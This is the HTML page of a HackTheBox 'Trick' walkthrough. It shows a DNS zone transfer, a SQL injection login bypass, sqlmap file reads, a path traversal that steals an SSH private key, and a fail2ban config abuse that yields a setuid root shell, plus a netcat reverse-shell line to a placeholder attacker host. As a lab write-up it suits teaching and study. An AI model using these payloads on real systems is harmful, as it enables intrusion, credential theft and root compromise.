@@ -1,0 +1,183 @@
+<!DOCTYPE html><html lang="en" data-theme> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Trick — HackTheBox Walkthrough · Feizal Said</title><meta name="description" content="DNS zone transfer to a hidden vhost, SQL injection and LFI on the payroll app, then fail2ban action.d abuse for root."><!-- Theme: apply before paint to avoid FOUC --><script>
+      (function () {
+        try {
+          var t = localStorage.getItem('theme');
+          var dark = t
+            ? t === 'dark'
+            : window.matchMedia('(prefers-color-scheme: dark)').matches;
+          document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+        } catch (e) {
+          document.documentElement.setAttribute(
+            'data-theme',
+            window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
+          );
+        }
+      })();
+    </script><!-- Social / OG --><meta property="og:type" content="website"><meta property="og:title" content="Trick — HackTheBox Walkthrough · Feizal Said"><meta property="og:description" content="DNS zone transfer to a hidden vhost, SQL injection and LFI on the payroll app, then fail2ban action.d abuse for root."><meta property="og:url" content="https://feizalsaid.github.io/writeups/htb-trick-01/"><meta property="og:image" content="https://feizalsaid.github.io/images/og-cover.png"><meta property="og:site_name" content="Feizal Said"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Trick — HackTheBox Walkthrough · Feizal Said"><meta name="twitter:description" content="DNS zone transfer to a hidden vhost, SQL injection and LFI on the payroll app, then fail2ban action.d abuse for root."><meta name="twitter:image" content="https://feizalsaid.github.io/images/og-cover.png"><link rel="canonical" href="https://feizalsaid.github.io/writeups/htb-trick-01/"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><!-- Fonts --><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"><!-- Structured data --><script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "Person",
+        "name": "Feizal Said",
+        "url": {new URL('/', SITE).href},
+        "jobTitle": "Cybersecurity & Cloud Security Engineer",
+        "email": "mailto:feizalsaid9@gmail.com",
+        "sameAs": [
+          "https://github.com/feizalsaid",
+          "https://www.linkedin.com/in/feizalsaid",
+          "https://app.hackthebox.com/users/feizalsaid",
+          "https://tryhackme.com/p/feizalsaid"
+        ]
+      }
+    </script><link rel="stylesheet" href="/_astro/certifications.BBSei92j.css">
+<style>.writeup-article{max-width:48rem;margin:0 auto;padding:2rem 1.25rem 4rem}.back-link{color:var(--accent-text);font-size:.85rem;text-decoration:none}.back-link:hover{text-decoration:underline}.article-head{margin-bottom:2rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border)}.meta-row{display:flex;align-items:center;gap:.75rem;flex-wrap:wrap;margin-bottom:1rem}.meta{color:var(--text-muted);font-size:.8rem}.article-title{font-size:clamp(1.7rem,4vw,2.4rem);margin:0 0 .75rem}.article-desc{color:var(--text-secondary);font-size:1.02rem;line-height:1.6;margin:0 0 1rem}.tag-row{list-style:none;display:flex;flex-wrap:wrap;gap:.5rem;padding:0;margin:0}.article-footer{margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
+</style></head> <body> <!-- Background layers --> <div class="grid-bg" aria-hidden="true"></div> <div class="glow-orb glow-orb-1" aria-hidden="true"></div> <div class="glow-orb glow-orb-2" aria-hidden="true"></div> <div class="relative z-10 flex min-h-screen flex-col"> <header class="site-header"> <div class="header-inner"> <a class="logo" href="/" aria-label="Feizal Said — home"> <span class="prompt" aria-hidden="true">$</span> <span class="logo-name">feizal<span class="path">@sec</span> ~</span> </a> <nav aria-label="Primary"> <ul class="nav-list"> <li> <a class="nav-link" href="/"> Home </a> </li><li> <a class="nav-link" href="/certifications/"> Certifications </a> </li><li> <a class="nav-link" href="/skills/"> Skills </a> </li><li> <a class="nav-link" href="/projects/"> Projects </a> </li><li> <a class="nav-link active" href="/writeups/" aria-current="page"> Writeups </a> </li> </ul> </nav> <button id="themeToggle" class="theme-toggle" type="button" aria-label="Toggle color theme" data-theme-icon> <svg class="icon-moon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path> </svg> <svg class="icon-sun" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> <script type="module">const c=document.getElementById("themeToggle");c&&c.addEventListener("click",()=>{const t=document.documentElement,e=t.getAttribute("data-theme")==="dark"?"light":"dark";t.setAttribute("data-theme",e);try{localStorage.setItem("theme",e)}catch{}});</script>  </div> </header>  <main class="relative flex-1">  <article class="writeup-article"> <a class="back-link font-mono" href="/writeups/">← all writeups</a> <header class="article-head"> <div class="meta-row"> <span class="cat-badge offensive">Offensive</span> <span class="meta font-mono"><time datetime="2026-09-08T00:00:00.000Z">September 8, 2026</time></span> <span class="meta font-mono">12 min read</span> </div> <h1 class="article-title font-display">Trick — HackTheBox Walkthrough</h1> <p class="article-desc">DNS zone transfer to a hidden vhost, SQL injection and LFI on the payroll app, then fail2ban action.d abuse for root.</p> <ul class="tag-row"> <li class="tag">HackTheBox</li><li class="tag">HTB</li><li class="tag">CPTS</li><li class="tag">Linux</li><li class="tag">DNS</li><li class="tag">Zone Transfer</li><li class="tag">SQL Injection</li><li class="tag">LFI</li><li class="tag">fail2ban</li><li class="tag">Privilege Escalation</li> <li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1596</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1590</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1190</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1213</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1552.004</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1078.002</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1562.001</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1548.001</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1543.002</li> </ul> </header> <div class="writeup-body"><p><strong>Machine:</strong> Trick
+<strong>OS:</strong> Linux (Debian 10)
+<strong>Difficulty:</strong> Easy
+<strong>Key Techniques:</strong> DNS AXFR zone transfer, SQL injection auth bypass, MySQL <code>FILE</code> read, single-pass filter bypass LFI, SSH key theft, fail2ban <code>action.d</code> abuse</p>
+<hr>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -p-</span><span style="color:#79B8FF"> --min-rate</span><span style="color:#79B8FF"> 10000</span><span style="color:#79B8FF"> 10.129.53.213</span></span>
+<span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> 22,25,53,80</span><span style="color:#79B8FF"> -sCV</span><span style="color:#79B8FF"> 10.129.53.213</span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>OpenSSH 7.9p1 Debian 10+deb10u2</td></tr><tr><td>25</td><td>SMTP</td><td>Postfix smtpd (VRFY enabled)</td></tr><tr><td>53</td><td>DNS</td><td>ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian)</td></tr><tr><td>80</td><td>HTTP</td><td>nginx 1.14.2 — “Coming Soon - Start Bootstrap Theme”</td></tr></tbody></table>
+<h3 id="dns-enumeration">DNS Enumeration</h3>
+<p>Resolve the PTR for the box, then test for a zone transfer:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">dig</span><span style="color:#9ECBFF"> +noall</span><span style="color:#9ECBFF"> +answer</span><span style="color:#9ECBFF"> @10.129.53.213</span><span style="color:#79B8FF"> -x</span><span style="color:#79B8FF"> 10.129.53.213</span></span>
+<span class="line"><span style="color:#6A737D"># trick.htb.</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">dig</span><span style="color:#9ECBFF"> +noall</span><span style="color:#9ECBFF"> +answer</span><span style="color:#9ECBFF"> @10.129.53.213</span><span style="color:#9ECBFF"> axfr</span><span style="color:#9ECBFF"> trick.htb</span></span>
+<span class="line"><span style="color:#6A737D"># trick.htb.                  A    127.0.0.1</span></span>
+<span class="line"><span style="color:#6A737D"># preprod-payroll.trick.htb.  CNAME trick.htb.</span></span></code></pre>
+<p>The name server permits <strong>AXFR from anyone</strong> — a classic misconfiguration that leaks internal hostnames. Add them to <code>/etc/hosts</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">10.129.53.213</span><span style="color:#9ECBFF"> trick.htb</span><span style="color:#9ECBFF"> preprod-payroll.trick.htb</span></span></code></pre>
+<h3 id="virtual-host-fuzzing">Virtual Host Fuzzing</h3>
+<p>The public site is a dead-end “Coming Soon” page, but fuzzing the vhost with a <code>preprod-</code> pattern reveals a second application:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">wfuzz</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> http://10.129.53.213</span><span style="color:#79B8FF"> -H</span><span style="color:#9ECBFF"> "Host: preprod-FUZZ.trick.htb"</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -w</span><span style="color:#9ECBFF"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><span style="color:#79B8FF"> --hh</span><span style="color:#79B8FF"> 5480</span></span>
+<span class="line"><span style="color:#6A737D"># 000000254: 200 ... "marketing"  -> preprod-marketing.trick.htb</span></span></code></pre>
+<p>Add <code>preprod-marketing.trick.htb</code> to <code>/etc/hosts</code> too.</p>
+<hr>
+<h2 id="foothold--sql-injection-on-the-payroll-app">Foothold — SQL Injection on the Payroll App</h2>
+<p><code>preprod-payroll.trick.htb</code> runs <em>Employee’s Payroll Management System</em>, an off-the-shelf PHP app vulnerable to <strong>CVE-2022-28468</strong> — a SQL injection in the login form.</p>
+<h3 id="manual-authentication-bypass">Manual authentication bypass</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Username: ' or 1=1 -- -</span></span>
+<span class="line"><span>Password: anything</span></span></code></pre>
+<p>This logs in as the Administrator.</p>
+<h3 id="sqlmap-via-a-saved-request">sqlmap via a saved request</h3>
+<p>Capture the login <code>POST</code> as <code>login.req</code>, then:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sqlmap</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> login.req</span><span style="color:#79B8FF"> --batch</span><span style="color:#79B8FF"> --technique</span><span style="color:#9ECBFF"> B</span><span style="color:#79B8FF"> --level</span><span style="color:#79B8FF"> 5</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">sqlmap</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> login.req</span><span style="color:#79B8FF"> --batch</span><span style="color:#79B8FF"> --current-user</span></span>
+<span class="line"><span style="color:#6A737D"># remo@localhost</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">sqlmap</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> login.req</span><span style="color:#79B8FF"> --batch</span><span style="color:#79B8FF"> --dbs</span></span>
+<span class="line"><span style="color:#6A737D"># information_schema, payroll_db</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">sqlmap</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> login.req</span><span style="color:#79B8FF"> --batch</span><span style="color:#79B8FF"> -D</span><span style="color:#9ECBFF"> payroll_db</span><span style="color:#79B8FF"> -T</span><span style="color:#9ECBFF"> users</span><span style="color:#79B8FF"> --dump</span></span>
+<span class="line"><span style="color:#6A737D"># Enemigosss : SuperGucciRainbowCake   (does not work for SSH)</span></span></code></pre>
+<h3 id="reading-files-with-mysql-file-privileges">Reading files with MySQL <code>FILE</code> privileges</h3>
+<p>Because MySQL runs with <code>FILE</code>, sqlmap can read arbitrary local files:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sqlmap</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> login.req</span><span style="color:#79B8FF"> --batch</span><span style="color:#79B8FF"> --file-read=/etc/passwd</span></span>
+<span class="line"><span style="color:#6A737D"># michael:x:1001:1001::/home/michael:/bin/bash</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">sqlmap</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> login.req</span><span style="color:#79B8FF"> --batch</span><span style="color:#79B8FF"> --file-read=/etc/nginx/sites-enabled/default</span></span></code></pre>
+<p>The nginx config exposes another vhost rooted at <code>/var/www/market</code> whose FastCGI socket (<code>php7.3-fpm-michael.sock</code>) confirms the site runs <strong>as michael</strong>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sqlmap</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> login.req</span><span style="color:#79B8FF"> --batch</span><span style="color:#79B8FF"> --file-read=/var/www/market/index.php</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line"><span style="color:#E1E4E8">$file </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">'page'</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">!</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($file) </span><span style="color:#F97583">||</span><span style="color:#E1E4E8"> ($file</span><span style="color:#F97583">==</span><span style="color:#9ECBFF">"index.php"</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line"><span style="color:#F97583">   include</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"/var/www/market/home.html"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">} </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">   include</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"/var/www/market/"</span><span style="color:#F97583">.</span><span style="color:#79B8FF">str_replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"../"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">,$file));</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"><span style="color:#F97583">?></span></span></code></pre>
+<hr>
+<h2 id="local-file-inclusion--shell-as-michael">Local File Inclusion → Shell as michael</h2>
+<p>The <code>str_replace("../","")</code> filter is <strong>single-pass</strong> — feeding <code>....//</code> collapses to <code>../</code> after the replacement, bypassing it.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># Confirm LFI</span></span>
+<span class="line"><span style="color:#B392F0">curl</span><span style="color:#9ECBFF"> 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Steal michael's SSH private key</span></span>
+<span class="line"><span style="color:#B392F0">curl</span><span style="color:#9ECBFF"> 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsa'</span><span style="color:#79B8FF"> -o</span><span style="color:#9ECBFF"> michael_rsa</span></span>
+<span class="line"><span style="color:#B392F0">chmod</span><span style="color:#79B8FF"> 600</span><span style="color:#9ECBFF"> michael_rsa</span></span>
+<span class="line"><span style="color:#B392F0">ssh</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> michael_rsa</span><span style="color:#9ECBFF"> michael@trick.htb</span></span></code></pre>
+<p>Alternative footholds documented for this box:</p>
+<ul>
+<li><strong>Mail poisoning</strong> — send a PHP payload to michael’s local mailbox with <code>swaks</code>, then include <code>/var/mail/michael</code>.</li>
+<li><strong>Log poisoning</strong> — inject PHP into the <code>User-Agent</code>, then include <code>/var/log/nginx/access.log</code>.</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> ~/user.txt</span></span></code></pre>
+<hr>
+<h2 id="privilege-escalation--fail2ban-actiond-abuse">Privilege Escalation — fail2ban <code>action.d</code> Abuse</h2>
+<p>Check sudo rights and group membership:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sudo</span><span style="color:#79B8FF"> -l</span></span>
+<span class="line"><span style="color:#6A737D"># (root) NOPASSWD: /etc/init.d/fail2ban restart</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">id</span></span>
+<span class="line"><span style="color:#6A737D"># uid=1001(michael) groups=1001(michael),1002(security)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">ls</span><span style="color:#79B8FF"> -ld</span><span style="color:#9ECBFF"> /etc/fail2ban/action.d/</span></span>
+<span class="line"><span style="color:#6A737D"># drwxrwx--- 2 root security</span></span></code></pre>
+<p>michael is in the <strong>security</strong> group, which has write access to <code>/etc/fail2ban/action.d/</code>, and can restart fail2ban as root. The default ban action is <code>iptables-multiport</code> — whose <code>actionban</code> directive runs <strong>as root</strong> when a ban fires.</p>
+<h3 id="weaponize-the-action">Weaponize the action</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">cp</span><span style="color:#9ECBFF"> /etc/fail2ban/action.d/iptables-multiport.conf</span><span style="color:#9ECBFF"> /tmp/</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">sed</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> 's|^actionban = .*|actionban = cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash|'</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#9ECBFF">  /etc/fail2ban/action.d/iptables-multiport.conf</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> /etc/init.d/fail2ban</span><span style="color:#9ECBFF"> restart</span></span></code></pre>
+<p><em>(A reverse shell via <code>actionban = nc -e /bin/bash &#x3C;attacker> 4444</code> also works.)</em></p>
+<h3 id="trigger-the-ban">Trigger the ban</h3>
+<p>The <code>sshd</code> jail bans an IP after a handful of failed logins — brute-force it to fire <code>actionban</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hydra</span><span style="color:#79B8FF"> -l</span><span style="color:#9ECBFF"> michael</span><span style="color:#79B8FF"> -P</span><span style="color:#9ECBFF"> /usr/share/wordlists/rockyou.txt</span><span style="color:#9ECBFF"> ssh://trick.htb</span></span>
+<span class="line"><span style="color:#6A737D"># or: nxc ssh trick.htb -u fakeuser -p /usr/share/wordlists/rockyou.txt</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">ls</span><span style="color:#79B8FF"> -la</span><span style="color:#9ECBFF"> /tmp/rootbash</span></span>
+<span class="line"><span style="color:#B392F0">/tmp/rootbash</span><span style="color:#79B8FF"> -p</span></span>
+<span class="line"><span style="color:#B392F0">root@trick:~#</span><span style="color:#9ECBFF"> id</span></span>
+<span class="line"><span style="color:#E1E4E8">uid</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">) gid</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">root@trick:~#</span><span style="color:#9ECBFF"> cat</span><span style="color:#9ECBFF"> /root/root.txt</span></span></code></pre>
+<hr>
+<h2 id="flags">Flags</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /home/michael/user.txt</span></span>
+<span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /root/root.txt</span></span></code></pre>
+<p>Flag values are unique to each HTB instance and are intentionally omitted.</p>
+<hr>
+<h2 id="lessons-learned">Lessons Learned</h2>
+<ol>
+<li><strong>Zone transfers should be restricted.</strong> An open AXFR handed over an internal vhost that was never meant to be public.</li>
+<li><strong>Single-pass filters are not filters.</strong> <code>str_replace("../","")</code> is trivially bypassed with <code>....//</code>.</li>
+<li><strong>SQL injection with <code>FILE</code> privileges is full filesystem read.</strong> It exposed <code>/etc/passwd</code>, the nginx config, and application source in one step.</li>
+<li><strong>Group-based write access to service configs is privilege escalation.</strong> <code>security</code> owning <code>fail2ban/action.d</code> plus <code>systemctl restart</code> equals root.</li>
+<li><strong><code>NOPASSWD</code> sudo deserves scrutiny.</strong> Restarting a service that reads attacker-writable config is effectively arbitrary code execution as root.</li>
+</ol></div> <nav class="article-footer" aria-label="Writeup navigation"> <a class="back-link font-mono" href="/writeups/">← back to writeups</a> </nav> </article>  </main> <footer class="site-footer"> <div class="footer-inner"> <p class="footer-line"> <span class="prompt" aria-hidden="true">$</span> whoami
+<span class="dim">→ Feizal Said · Nairobi, Kenya</span> </p> <ul class="footer-links" aria-label="Social links"> <li><a href="https://github.com/feizalsaid" target="_blank" rel="noopener noreferrer">GitHub</a></li><li><a href="https://www.linkedin.com/in/feizalsaid" target="_blank" rel="noopener noreferrer">LinkedIn</a></li><li><a href="https://app.hackthebox.com/users/feizalsaid" target="_blank" rel="noopener noreferrer">Hack The Box</a></li><li><a href="https://tryhackme.com/p/feizalsaid" target="_blank" rel="noopener noreferrer">TryHackMe</a></li><li><a href="mailto:feizalsaid9@gmail.com" target="_blank" rel="noopener noreferrer">Email</a></li> </ul> <p class="copy">&copy; 2026 Feizal Said. Built with Astro.</p> </div> </footer>  </div> </body></html> 
